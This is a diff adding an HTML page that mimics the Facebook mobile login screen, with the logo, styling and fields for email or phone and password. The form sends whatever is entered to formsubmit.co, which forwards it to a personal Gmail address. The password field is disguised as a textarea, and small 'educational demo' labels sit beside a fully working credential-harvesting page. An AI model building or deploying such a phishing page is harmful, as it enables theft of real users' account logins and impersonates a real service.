@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#f0f2f5">
+  <title>Login Interface Demo</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      min-height: 100dvh;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: clamp(38px, 11vw, 48px);
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      color: #303846;
+      font-size: 16px;
+      line-height: 1.5;
+      margin: 0 0 22px;
+    }
+
+    .demo-label {
+      background: #e4edff;
+      color: #174ea6;
+      padding: 10px;
+      font-size: 13px;
+      line-height: 1.4;
+      border-radius: 8px;
+      margin-bottom: 14px;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 18px;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.10);
+    }
+
+    input, textarea {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 13px;
+      border: 1px solid #ccd0d5;
+      border-radius: 7px;
+      font-size: 16px;
+      background: #fff;
+    }
+
+    input:focus, textarea:focus {
+      outline: 2px solid #1877f2;
+      outline-offset: 1px;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      min-height: 50px;
+      border: none;
+      border-radius: 7px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      padding: 12px;
+    }
+
+    button:active {
+      background: #125ec4;
+    }
+
+    #status {
+      color: #176b36;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 0;
+      overflow-wrap: anywhere;
+    }
+
+    .footer {
+      margin-top: 22px;
+      color: #606770;
+      font-size: 12px;
+    }
+
+    @media (max-width: 360px) {
+      body { padding: 14px 10px; }
+      .login-box { padding: 14px; }
+      .subtitle { font-size: 15px; }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="container">
+    <h1 class="logo">facebook</h1>
+
+    <p class="subtitle">
+      Mobile login interface demonstration
+    </p>
+
+    <div class="demo-label">
+      Educational demo. Use fictional information only.
+    </div>
+
+    <section class="login-box">
+      <form
+        action="https://formsubmit.co/khalednayeem20@gmail.com"
+        method="POST"
+      >
+        <input
+          id="demoId"
+          name="demoId"
+          type="text"
+          placeholder="Email or Phone Number"
+          aria-label="Email or Phone number"
+          autocomplete="off"
+          required
+        >
+
+        <textarea
+          id="message"
+          name="message"
+          rows="1"
+          placeholder="Password"
+          aria-label="Password"
+          required
+        ></textarea>
+
+        <input
+          type="hidden"
+          name="_subject"
+          value="Website Demo Test Message"
+        >
+
+        <button type="submit">
+          Log In
+        </button>
+      </form>
+
+      <p id="status" role="status" aria-live="polite"></p>
+    </section>
+
+    <p class="footer">
+      Educational demo · Not an official Facebook service
+    </p>
+  </main>
+</body>
+</html>
